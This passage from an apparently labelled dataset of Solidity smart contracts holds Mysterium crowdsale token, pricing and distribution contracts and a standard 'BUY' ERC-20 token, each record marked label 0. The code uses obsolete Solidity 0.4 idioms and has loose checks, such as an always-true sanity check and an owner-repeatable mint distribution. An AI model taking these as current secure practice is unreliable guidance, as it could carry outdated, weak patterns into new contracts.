allowance(address _owner, address _spender) constant returns (uint remaining) {\r\r\n    return allowed[_owner][_spender];\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Atomic increment of approved spending\r\r\n   *\r\r\n   * Works around https:\/\/github.com\/ethereum\/EIPs\/issues\/20#issuecomment-263524729\r\r\n   *\r\r\n   *\/\r\r\n  function addApproval(address _spender, uint _addedValue)\r\r\n  onlyPayloadSize(2 * 32)\r\r\n  returns (bool success) {\r\r\n      uint oldValue = allowed[msg.sender][_spender];\r\r\n      allowed[msg.sender][_spender] = safeAdd(oldValue, _addedValue);\r\r\n      Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\r\r\n      return true;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Atomic decrement of approved spending.\r\r\n   *\r\r\n   * Works around https:\/\/github.com\/ethereum\/EIPs\/issues\/20#issuecomment-263524729\r\r\n   *\/\r\r\n  function subApproval(address _spender, uint _subtractedValue)\r\r\n  onlyPayloadSize(2 * 32)\r\r\n  returns (bool success) {\r\r\n\r\r\n      uint oldVal = allowed[msg.sender][_spender];\r\r\n\r\r\n      if (_subtractedValue > oldVal) {\r\r\n          allowed[msg.sender][_spender] = 0;\r\r\n      } else {\r\r\n          allowed[msg.sender][_spender] = safeSub(oldVal, _subtractedValue);\r\r\n      }\r\r\n      Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\r\r\n      return true;\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * Upgrade agent interface inspired by Lunyr.\r\r\n *\r\r\n * Upgrade agent transfers tokens to a new contract.\r\r\n * Upgrade agent itself can be the token contract, or just a middle man contract doing the heavy lifting.\r\r\n *\/\r\r\ncontract UpgradeAgent {\r\r\n\r\r\n  uint public originalSupply;\r\r\n\r\r\n  \/** Interface marker *\/\r\r\n  function isUpgradeAgent() public constant returns (bool) {\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  function upgradeFrom(address _from, uint256 _value) public;\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * A token upgrade mechanism where users can opt-in amount of tokens to the next smart contract revision.\r\r\n *\r\r\n * First envisioned by Golem and Lunyr projects.\r\r\n *\/\r\r\ncontract UpgradeableToken is StandardToken {\r\r\n\r\r\n  \/** Contract \/ person who can set the upgrade path. This can be the same as team multisig wallet, as what it is with its default value. *\/\r\r\n  address public upgradeMaster;\r\r\n\r\r\n  \/** The next contract where the tokens will be migrated. *\/\r\r\n  UpgradeAgent public upgradeAgent;\r\r\n\r\r\n  \/** How many tokens we have upgraded by now. *\/\r\r\n  uint256 public totalUpgraded;\r\r\n\r\r\n  \/**\r\r\n   * Upgrade states.\r\r\n   *\r\r\n   * - NotAllowed: The child contract has not reached a condition where the upgrade can bgun\r\r\n   * - WaitingForAgent: Token allows upgrade, but we don&#39;t have a new agent yet\r\r\n   * - ReadyToUpgrade: The agent is set, but not a single token has been upgraded yet\r\r\n   * - Upgrading: Upgrade agent is set and the balance holders can upgrade their tokens\r\r\n   *\r\r\n   *\/\r\r\n  enum UpgradeState {Unknown, NotAllowed, WaitingForAgent, ReadyToUpgrade, Upgrading}\r\r\n\r\r\n  \/**\r\r\n   * Somebody has upgraded some of his tokens.\r\r\n   *\/\r\r\n  event Upgrade(address indexed _from, address indexed _to, uint256 _value);\r\r\n\r\r\n  \/**\r\r\n   * New upgrade agent available.\r\r\n   *\/\r\r\n  event UpgradeAgentSet(address agent);\r\r\n\r\r\n  \/**\r\r\n   * Do not allow construction without upgrade master set.\r\r\n   *\/\r\r\n  function UpgradeableToken(address _upgradeMaster) {\r\r\n    upgradeMaster = _upgradeMaster;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Allow the token holder to upgrade some of their tokens to a new contract.\r\r\n   *\/\r\r\n  function upgrade(uint256 value) public {\r\r\n\r\r\n      UpgradeState state = getUpgradeState();\r\r\n      if(!(state == UpgradeState.ReadyToUpgrade || state == UpgradeState.Upgrading)) {\r\r\n        \/\/ Called in a bad state\r\r\n        throw;\r\r\n      }\r\r\n\r\r\n      \/\/ Validate input value.\r\r\n      if (value == 0) throw;\r\r\n\r\r\n      balances[msg.sender] = safeSub(balances[msg.sender], value);\r\r\n\r\r\n      \/\/ Take tokens out from circulation\r\r\n      totalSupply = safeSub(totalSupply, value);\r\r\n      totalUpgraded = safeAdd(totalUpgraded, value);\r\r\n\r\r\n      \/\/ Upgrade agent reissues the tokens\r\r\n      upgradeAgent.upgradeFrom(msg.sender, value);\r\r\n      Upgrade(msg.sender, upgradeAgent, value);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Set an upgrade agent that handles\r\r\n   *\/\r\r\n  function setUpgradeAgent(address agent) external {\r\r\n\r\r\n      if(!canUpgrade()) {\r\r\n        \/\/ The token is not yet in a state that we could think upgrading\r\r\n        throw;\r\r\n      }\r\r\n\r\r\n      if (agent == 0x0) throw;\r\r\n      \/\/ Only a master can designate the next agent\r\r\n      if (msg.sender != upgradeMaster) throw;\r\r\n      \/\/ Upgrade has already begun for an agent\r\r\n      if (getUpgradeState() == UpgradeState.Upgrading) throw;\r\r\n\r\r\n      upgradeAgent = UpgradeAgent(agent);\r\r\n\r\r\n      \/\/ Bad interface\r\r\n      if(!upgradeAgent.isUpgradeAgent()) throw;\r\r\n      \/\/ Make sure that token supplies match in source and target\r\r\n      if (upgradeAgent.originalSupply() != totalSupply) throw;\r\r\n\r\r\n      UpgradeAgentSet(upgradeAgent);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Get the state of the token upgrade.\r\r\n   *\/\r\r\n  function getUpgradeState() public constant returns(UpgradeState) {\r\r\n    if(!canUpgrade()) return UpgradeState.NotAllowed;\r\r\n    else if(address(upgradeAgent) == 0x00) return UpgradeState.WaitingForAgent;\r\r\n    else if(totalUpgraded == 0) return UpgradeState.ReadyToUpgrade;\r\r\n    else return UpgradeState.Upgrading;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Change the upgrade master.\r\r\n   *\r\r\n   * This allows us to set a new owner for the upgrade mechanism.\r\r\n   *\/\r\r\n  function setUpgradeMaster(address master) public {\r\r\n      if (master == 0x0) throw;\r\r\n      if (msg.sender != upgradeMaster) throw;\r\r\n      upgradeMaster = master;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Child contract can enable to provide the condition when the upgrade can begun.\r\r\n   *\/\r\r\n  function canUpgrade() public constant returns(bool) {\r\r\n     return true;\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * Define interface for releasing the token transfer after a successful crowdsale.\r\r\n *\/\r\r\ncontract ReleasableToken is ERC20, Ownable {\r\r\n\r\r\n  \/* The finalizer contract that allows unlift the transfer limits on this token *\/\r\r\n  address public releaseAgent;\r\r\n\r\r\n  \/** A crowdsale contract can release us to the wild if ICO success. If false we are are in transfer lock up period.*\/\r\r\n  bool public released = false;\r\r\n\r\r\n  \/** Map of agents that are allowed to transfer tokens regardless of the lock down period. These are crowdsale contracts and possible the team multisig itself. *\/\r\r\n  mapping (address => bool) public transferAgents;\r\r\n\r\r\n  \/**\r\r\n   * Limit token transfer until the crowdsale is over.\r\r\n   *\r\r\n   *\/\r\r\n  modifier canTransfer(address _sender) {\r\r\n\r\r\n    if(!released) {\r\r\n        if(!transferAgents[_sender]) {\r\r\n            throw;\r\r\n        }\r\r\n    }\r\r\n\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Set the contract that can call release and make the token transferable.\r\r\n   *\r\r\n   * Design choice. Allow reset the release agent to fix fat finger mistakes.\r\r\n   *\/\r\r\n  function setReleaseAgent(address addr) onlyOwner inReleaseState(false) public {\r\r\n\r\r\n    \/\/ We don&#39;t do interface check here as we might want to a normal wallet address to act as a release agent\r\r\n    releaseAgent = addr;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Owner can allow a particular address (a crowdsale contract) to transfer tokens despite the lock up period.\r\r\n   *\/\r\r\n  function setTransferAgent(address addr, bool state) onlyOwner inReleaseState(false) public {\r\r\n    transferAgents[addr] = state;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * One way function to release the tokens to the wild.\r\r\n   *\r\r\n   * Can be called only from the release agent that is the final ICO contract. It is only called if the crowdsale has been success (first milestone reached).\r\r\n   *\/\r\r\n  function releaseTokenTransfer() public onlyReleaseAgent {\r\r\n    released = true;\r\r\n  }\r\r\n\r\r\n  \/** The function can be called only before or after the tokens have been releasesd *\/\r\r\n  modifier inReleaseState(bool releaseState) {\r\r\n    if(releaseState != released) {\r\r\n        throw;\r\r\n    }\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  \/** The function can be called only by a whitelisted release agent. *\/\r\r\n  modifier onlyReleaseAgent() {\r\r\n    if(msg.sender != releaseAgent) {\r\r\n        throw;\r\r\n    }\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  function transfer(address _to, uint _value) canTransfer(msg.sender) returns (bool success) {\r\r\n    \/\/ Call StandardToken.transfer()\r\r\n   return super.transfer(_to, _value);\r\r\n  }\r\r\n\r\r\n  function transferFrom(address _from, address _to, uint _value) canTransfer(_from) returns (bool success) {\r\r\n    \/\/ Call StandardToken.transferForm()\r\r\n    return super.transferFrom(_from, _to, _value);\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * A token that can increase its supply by another contract.\r\r\n *\r\r\n * This allows uncapped crowdsale by dynamically increasing the supply when money pours in.\r\r\n * Only mint agents, contracts whitelisted by owner, can mint new tokens.\r\r\n *\r\r\n *\/\r\r\ncontract MintableToken is StandardToken, Ownable {\r\r\n\r\r\n  using SafeMathLib for uint;\r\r\n\r\r\n  bool public mintingFinished = false;\r\r\n\r\r\n  \/** List of agents that are allowed to create new tokens *\/\r\r\n  mapping (address => bool) public mintAgents;\r\r\n\r\r\n  \/**\r\r\n   * Create new tokens and allocate them to an address..\r\r\n   *\r\r\n   * Only callably by a crowdsale contract (mint agent).\r\r\n   *\/\r\r\n  function mint(address receiver, uint amount) onlyMintAgent canMint public {\r\r\n\r\r\n    if(amount == 0) {\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    totalSupply = totalSupply.plus(amount);\r\r\n    balances[receiver] = balances[receiver].plus(amount);\r\r\n    Minted(receiver, amount);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Owner can allow a crowdsale contract to mint new tokens.\r\r\n   *\/\r\r\n  function setMintAgent(address addr, bool state) onlyOwner canMint public {\r\r\n    mintAgents[addr] = state;\r\r\n  }\r\r\n\r\r\n  modifier onlyMintAgent() {\r\r\n    \/\/ Only crowdsale contracts are allowed to mint new tokens\r\r\n    if(!mintAgents[msg.sender]) {\r\r\n        throw;\r\r\n    }\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  \/** Make sure we are not done yet. *\/\r\r\n  modifier canMint() {\r\r\n    if(mintingFinished) throw;\r\r\n    _;\r\r\n  }\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * A crowdsaled token.\r\r\n *\r\r\n * An ERC-20 token designed specifically for crowdsales with investor protection and further development path.\r\r\n *\r\r\n * - The token transfer() is disabled until the crowdsale is over\r\r\n * - The token contract gives an opt-in upgrade path to a new contract\r\r\n * - The same token can be part of several crowdsales through approve() mechanism\r\r\n * - The token can be capped (supply set in the constructor) or uncapped (crowdsale contract can mint new tokens)\r\r\n *\r\r\n *\/\r\r\ncontract CrowdsaleToken is ReleasableToken, MintableToken, UpgradeableToken {\r\r\n\r\r\n  event UpdatedTokenInformation(string newName, string newSymbol);\r\r\n\r\r\n  string public name;\r\r\n\r\r\n  string public symbol;\r\r\n\r\r\n  uint public decimals;\r\r\n\r\r\n  \/**\r\r\n   * Construct the token.\r\r\n   *\r\r\n   * This token must be created through a team multisig wallet, so that it is owned by that wallet.\r\r\n   *\/\r\r\n  function CrowdsaleToken(string _name, string _symbol, uint _initialSupply, uint _decimals)\r\r\n    UpgradeableToken(msg.sender) {\r\r\n\r\r\n    \/\/ Create any address, can be transferred\r\r\n    \/\/ to team multisig via changeOwner(),\r\r\n    \/\/ also remember to call setUpgradeMaster()\r\r\n    owner = msg.sender;\r\r\n\r\r\n    name = _name;\r\r\n    symbol = _symbol;\r\r\n\r\r\n    totalSupply = _initialSupply;\r\r\n\r\r\n    decimals = _decimals;\r\r\n\r\r\n    \/\/ Create initially all balance on the team multisig\r\r\n    balances[owner] = totalSupply;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * When token is released to be transferable, enforce no new tokens can be created.\r\r\n   *\/\r\r\n  function releaseTokenTransfer() public onlyReleaseAgent {\r\r\n    mintingFinished = true;\r\r\n    super.releaseTokenTransfer();\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Allow upgrade agent functionality kick in only if the crowdsale was success.\r\r\n   *\/\r\r\n  function canUpgrade() public constant returns(bool) {\r\r\n    return released;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Owner can update token information here\r\r\n   *\/\r\r\n  function setTokenInformation(string _name, string _symbol) onlyOwner {\r\r\n    name = _name;\r\r\n    symbol = _symbol;\r\r\n\r\r\n    UpdatedTokenInformation(name, symbol);\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * Fixed crowdsale pricing - everybody gets the same price.\r\r\n *\/\r\r\ncontract MysteriumPricing is PricingStrategy, Ownable {\r\r\n\r\r\n  using SafeMathLib for uint;\r\r\n\r\r\n  \/\/ The conversion rate: how many weis is 1 CHF\r\r\n  \/\/ https:\/\/www.coingecko.com\/en\/price_charts\/ethereum\/chf\r\r\n  \/\/ 120.34587901 is 1203458\r\r\n  uint public chfRate;\r\r\n\r\r\n  uint public chfScale = 10000;\r\r\n\r\r\n  \/* How many weis one token costs *\/\r\r\n  uint public hardCapPrice = 12000;  \/\/ 1.2 * 10000 Expressed as CFH base points\r\r\n\r\r\n  uint public softCapPrice = 10000;  \/\/ 1.0 * 10000 Expressed as CFH base points\r\r\n\r\r\n  uint public softCapCHF = 6000000 * 10000; \/\/ Soft cap set in CHF\r\r\n\r\r\n  \/\/Address of the ICO contract:\r\r\n  Crowdsale public crowdsale;\r\r\n\r\r\n  function MysteriumPricing(uint initialChfRate) {\r\r\n    chfRate = initialChfRate;\r\r\n  }\r\r\n\r\r\n  \/\/\/ @dev Setting crowdsale for setConversionRate()\r\r\n  \/\/\/ @param _crowdsale The address of our ICO contract\r\r\n  function setCrowdsale(Crowdsale _crowdsale) onlyOwner {\r\r\n\r\r\n    if(!_crowdsale.isCrowdsale()) {\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    crowdsale = _crowdsale;\r\r\n  }\r\r\n\r\r\n  \/\/\/ @dev Here you can set the new CHF\/ETH rate\r\r\n  \/\/\/ @param _chfRate The rate how many weis is one CHF\r\r\n  function setConversionRate(uint _chfRate) onlyOwner {\r\r\n    \/\/Here check if ICO is active\r\r\n    if(now > crowdsale.startsAt())\r\r\n      throw;\r\r\n\r\r\n    chfRate = _chfRate;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Allow to set soft cap.\r\r\n   *\/\r\r\n  function setSoftCapCHF(uint _softCapCHF) onlyOwner {\r\r\n    softCapCHF = _softCapCHF;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Get CHF\/ETH pair as an integer.\r\r\n   *\r\r\n   * Used in distribution calculations.\r\r\n   *\/\r\r\n  function getEthChfPrice() public constant returns (uint) {\r\r\n    return chfRate \/ chfScale;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Currency conversion\r\r\n   *\r\r\n   * @param  chf CHF price * 100000\r\r\n   * @return wei price\r\r\n   *\/\r\r\n  function convertToWei(uint chf) public constant returns(uint) {\r\r\n    return chf.times(10**18) \/ chfRate;\r\r\n  }\r\r\n\r\r\n  \/\/\/ @dev Function which tranforms CHF softcap to weis\r\r\n  function getSoftCapInWeis() public returns (uint) {\r\r\n    return convertToWei(softCapCHF);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Calculate the current price for buy in amount.\r\r\n   *\r\r\n   * @param  {uint amount} How many tokens we get\r\r\n   *\/\r\r\n  function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint) {\r\r\n\r\r\n    uint multiplier = 10 ** decimals;\r\r\n    if (weiRaised > getSoftCapInWeis()) {\r\r\n      \/\/Here SoftCap is not active yet\r\r\n      return value.times(multiplier) \/ convertToWei(hardCapPrice);\r\r\n    } else {\r\r\n      return value.times(multiplier) \/ convertToWei(softCapPrice);\r\r\n    }\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * At the end of the successful crowdsale allocate % bonus of tokens and other parties.\r\r\n *\r\r\n * Unlock tokens.\r\r\n *\r\r\n *\/\r\r\ncontract MysteriumTokenDistribution is FinalizeAgent, Ownable {\r\r\n\r\r\n  using SafeMathLib for uint;\r\r\n\r\r\n  CrowdsaleToken public token;\r\r\n  Crowdsale public crowdsale;\r\r\n\r\r\n  MysteriumPricing public mysteriumPricing;\r\r\n\r\r\n  \/\/ Vaults:\r\r\n  address futureRoundVault;\r\r\n  address foundationWallet;\r\r\n  address teamVault;\r\r\n  address seedVault1; \/\/  0\r\r\n  address seedVault2; \/\/  12 months\r\r\n\r\r\n  \/\/ Expose the state of distribute for the examination\r\r\n  uint public future_round_coins;\r\r\n  uint public foundation_coins;\r\r\n  uint public team_coins;\r\r\n  uint public seed_coins_vault1;\r\r\n  uint public seed_coins_vault2;\r\r\n\r\r\n  function MysteriumTokenDistribution(CrowdsaleToken _token, Crowdsale _crowdsale, MysteriumPricing _mysteriumPricing) {\r\r\n    token = _token;\r\r\n    crowdsale = _crowdsale;\r\r\n\r\r\n    \/\/ Interface check\r\r\n    if(!crowdsale.isCrowdsale()) {\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    mysteriumPricing = _mysteriumPricing;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Post crowdsale distribution process.\r\r\n   *\r\r\n   * Exposed as public to make it testable.\r\r\n   *\/\r\r\n  function distribute(uint amount_raised_chf, uint eth_chf_price) {\r\r\n\r\r\n    \/\/ Only crowdsale contract or owner (manually) can trigger the distribution\r\r\n    if(!(msg.sender == address(crowdsale) || msg.sender == owner)) {\r\r\n      throw;\r\r\n    }\r\r\n\r\r\n    \/\/ Distribute:\r\r\n    \/\/ seed coins\r\r\n    \/\/ foundation coins\r\r\n    \/\/ team coins\r\r\n    \/\/ future_round_coins\r\r\n\r\r\n    future_round_coins = 486500484333000;\r\r\n    foundation_coins = 291900290600000;\r\r\n    team_coins = 324333656222000;\r\r\n    seed_coins_vault1 = 122400000000000;\r\r\n    seed_coins_vault2 = 489600000000000;\r\r\n\r\r\n    token.mint(futureRoundVault, future_round_coins);\r\r\n    token.mint(foundationWallet, foundation_coins);\r\r\n    token.mint(teamVault, team_coins);\r\r\n    token.mint(seedVault1, seed_coins_vault1);\r\r\n    token.mint(seedVault2, seed_coins_vault2);\r\r\n  }\r\r\n\r\r\n  \/\/\/ @dev Here you can set all the Vaults\r\r\n  function setVaults(\r\r\n    address _futureRoundVault,\r\r\n    address _foundationWallet,\r\r\n    address _teamVault,\r\r\n    address _seedVault1,\r\r\n    address _seedVault2\r\r\n  ) onlyOwner {\r\r\n    futureRoundVault = _futureRoundVault;\r\r\n    foundationWallet = _foundationWallet;\r\r\n    teamVault = _teamVault;\r\r\n    seedVault1 = _seedVault1;\r\r\n    seedVault2 = _seedVault2;\r\r\n  }\r\r\n\r\r\n  \/* Can we run finalize properly *\/\r\r\n  function isSane() public constant returns (bool) {\r\r\n    \/\/ TODO: Check all vaults implement the correct vault interface\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  function getDistributionFacts() public constant returns (uint chfRaised, uint chfRate) {\r\r\n    uint _chfRate = mysteriumPricing.getEthChfPrice();\r\r\n    return(crowdsale.weiRaised().times(_chfRate) \/ (10**18), _chfRate);\r\r\n  }\r\r\n\r\r\n  \/** Called once by crowdsale finalize() if the sale was success. *\/\r\r\n  function finalizeCrowdsale() public {\r\r\n\r\r\n    if(msg.sender == address(crowdsale) || msg.sender == owner) {\r\r\n      \/\/ The owner can distribute tokens for testing and in emergency\r\r\n      \/\/ Crowdsale distributes tokens at the end of the crowdsale\r\r\n      var (chfRaised, chfRate) = getDistributionFacts();\r\r\n      distribute(chfRaised, chfRate);\r\r\n    } else {\r\r\n       throw;\r\r\n    }\r\r\n  }\r\r\n\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.18;\r\r\n\r\r\n\/\/ ----------------------------------------------------------------------------\r\r\n\/\/ &#39;BUY&#39; token contract\r\r\n\/\/\r\r\n\/\/ Deployed to : 0x098cF6DB757c32b7180261C6fd7e461eD5eB706b\r\r\n\/\/ Symbol      : BUY\r\r\n\/\/ Name        : BUY Token\r\r\n\/\/ Total supply: 100000000000\r\r\n\/\/ Decimals    : 18\r\r\n\/\/\r\r\n\/\/ Enjoy.\r\r\n\/\/\r\r\n\/\/ (c) by Moritz Neto with BokkyPooBah \/ Bok Consulting Pty Ltd Au 2017. The MIT Licence.\r\r\n\/\/ ----------------------------------------------------------------------------\r\r\n\r\r\n\r\r\n\/\/ ----------------------------------------------------------------------------\r\r\n\/\/ Safe maths\r\r\n\/\/ ----------------------------------------------------------------------------\r\r\ncontract SafeMath {\r\r\n    function safeAdd(uint a, uint b) public pure returns (uint c) {\r\r\n        c = a + b;\r\r\n        require(c >= a);\r\r\n    }\r\r\n    function safeSub(uint a, uint b) public pure returns (uint c) {\r\r\n        require(b <= a);\r\r\n        c = a - b;\r\r\n    }\r\r\n    function safeMul(uint a, uint b) public pure returns (uint c) {\r\r\n        c = a * b;\r\r\n        require(a == 0 || c \/ a == b);\r\r\n    }\r\r\n    function safeDiv(uint a, uint b) public pure returns (uint c) {\r\r\n        require(b > 0);\r\r\n        c = a \/ b;\r\r\n    }\r\r\n}\r\r\n\r\r\n\r\r\n\/\/ ----------------------------------------------------------------------------\r\r\n\/\/ ERC Token Standard #20 Interface\r\r\n\/\/ https:\/\/github.com\/ethereum\/EIPs\/blob\/master\/EIPS\/eip-20-token-standard.md\r\r\n\/\/ ----------------------------------------------------------------------------\r\r\ncontract ERC20Interface {\r\r\n    function totalSupply() public constant returns (uint);\r\r\n    function balanceOf(address tokenOwner) public constant returns (uint balance);\r\r\n    function allowance(address tokenOwner, address spender) public constant returns (uint remaining);\r\r\n    function transfer(address to, uint tokens) public returns (bool success);\r\r\n    function approve(address spender, uint tokens) public returns (bool success);\r\r\n    function transferFrom(address from, address to, uint tokens) public returns (bool success);\r\r\n\r\r\n    event Transfer(address indexed from, address indexed to, uint tokens);\r\r\n    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\r\r\n}\r\r\n\r\r\n\r\r\n\/\/ ----------------------------------------------------------------------------\r\r\n\/\/ Contract function to receive approval and execute function in one call\r\r\n\/\/\r\r\n\/\/ Borrowed from MiniMeToken\r\r\n\/\/ ----------------------------------------------------------------------------\r\r\ncontract ApproveAndCallFallBack {\r\r\n    function receiveApproval(address from, uint256 tokens, address token, bytes data) public;\r\r\n}\r\r\n\r\r\n\r\r\n\/\/ ----------------------------------------------------------------------------\r\r\n\/\/ Owned contract\r\r\n\/\/ ----------------------------------------------------------------------------\r\r\ncontract Owned {\r\r\n    address public owner;\r\r\n    address public newOwner;\r\r\n\r\r\n    event OwnershipTransferred(address indexed _from, address indexed _to);\r\r\n\r\r\n    function Owned() public {\r\r\n        owner = msg.sender;\r\r\n    }\r\r\n\r\r\n    modifier onlyOwner {\r\r\n        require(msg.sender == owner);\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    function transferOwnership(address _newOwner) public onlyOwner {\r\r\n        newOwner = _newOwner;\r\r\n    }\r\r\n    function acceptOwnership() public {\r\r\n        require(msg.sender == newOwner);\r\r\n        OwnershipTransferred(owner, newOwner);\r\r\n        owner = newOwner;\r\r\n        newOwner = address(0);\r\r\n    }\r\r\n}\r\r\n\r\r\n\r\r\n\/\/ ----------------------------------------------------------------------------\r\r\n\/\/ ERC20 Token, with the addition of symbol, name and decimals and assisted\r\r\n\/\/ token transfers\r\r\n\/\/ ----------------------------------------------------------------------------\r\r\ncontract BUYToken is ERC20Interface, Owned, SafeMath {\r\r\n    string public symbol;\r\r\n    string public  name;\r\r\n    uint8 public decimals;\r\r\n    uint public _totalSupply;\r\r\n\r\r\n    mapping(address => uint) balances;\r\r\n    mapping(address => mapping(address => uint)) allowed;\r\r\n\r\r\n\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    \/\/ Constructor\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    function BUYToken() public {\r\r\n        symbol = \"BUY\";\r\r\n        name = \"BUY Token\";\r\r\n        decimals = 18;\r\r\n        _totalSupply = 100000000000000000000000000000;\r\r\n        balances[0x098cF6DB757c32b7180261C6fd7e461eD5eB706b] = _totalSupply;\r\r\n        Transfer(address(0), 0x098cF6DB757c32b7180261C6fd7e461eD5eB706b, _totalSupply);\r\r\n    }\r\r\n\r\r\n\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    \/\/ Total supply\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    function totalSupply() public constant returns (uint) {\r\r\n        return _totalSupply  - balances[address(0)];\r\r\n    }\r\r\n\r\r\n\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    \/\/ Get the token balance for account tokenOwner\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    function balanceOf(address tokenOwner) public constant returns (uint balance) {\r\r\n        return balances[tokenOwner];\r\r\n    }\r\r\n\r\r\n\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    \/\/ Transfer the balance from token owner&#39;s account to to account\r\r\n    \/\/ - Owner&#39;s account must have sufficient balance to transfer\r\r\n    \/\/ - 0 value transfers are allowed\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    function transfer(address to, uint tokens) public returns (bool success) {\r\r\n        balances[msg.sender] = safeSub(balances[msg.sender], tokens);\r\r\n        balances[to] = safeAdd(balances[to], tokens);\r\r\n        Transfer(msg.sender, to, tokens);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    \/\/ Token owner can approve for spender to transferFrom(...) tokens\r\r\n    \/\/ from the token owner&#39;s account\r\r\n    \/\/\r\r\n    \/\/ https:\/\/github.com\/ethereum\/EIPs\/blob\/master\/EIPS\/eip-20-token-standard.md\r\r\n    \/\/ recommends that there are no checks for the approval double-spend attack\r\r\n    \/\/ as this should be implemented in user interfaces \r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    function approve(address spender, uint tokens) public returns (bool success) {\r\r\n        allowed[msg.sender][spender] = tokens;\r\r\n        Approval(msg.sender, spender, tokens);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    \/\/ Transfer tokens from the from account to the to account\r\r\n    \/\/ \r\r\n    \/\/ The calling account must already have sufficient tokens approve(...)-d\r\r\n    \/\/ for spending from the from account and\r\r\n    \/\/ - From account must have sufficient balance to transfer\r\r\n    \/\/ - Spender must have sufficient allowance to transfer\r\r\n    \/\/ - 0 value transfers are allowed\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    function transferFrom(address from, address to, uint tokens) public returns (bool success) {\r\r\n        balances[from] = safeSub(balances[from], tokens);\r\r\n        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);\r\r\n        balances[to] = safeAdd(balances[to], tokens);\r\r\n        Transfer(from, to, tokens);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    \/\/ Returns the amount of tokens approved by the owner that can be\r\r\n    \/\/ transferred to the spender&#39;s account\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    function allowance(address tokenOwner, address spender) public constant returns (uint remaining) {\r\r\n        return allowed[tokenOwner][spender];\r\r\n    }\r\r\n\r\r\n\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    \/\/ Token owner can approve for spender to transferFrom(...) tokens\r\r\n    \/\/ from the token owner&#39;s account. The spender contract function\r\r\n    \/\/ receiveApproval(...) is then executed\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    function approveAndCall(address spender, uint tokens, bytes data) public returns (bool success) {\r\r\n        allowed[msg.sender][spender] = tokens;\r\r\n        Approval(msg.sender, spender, tokens);\r\r\n        ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, this, data);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    \/\/ Don&#39;t accept ETH\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    function () public payable {\r\r\n        revert();\r\r\n    }\r\r\n\r\r\n\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    \/\/ Owner can transfer out any accidentally sent ERC20 tokens\r\r\n    \/\/ ------------------------------------------------------------------------\r\r\n    function transferAnyERC20Token(address tokenAddress, uint tokens) public onlyOwner returns (bool success) {\r\r\n        return ERC20Interface(tokenAddress).transfer(owner, tokens);\r\r\n    }\r\r\n}","label":0}
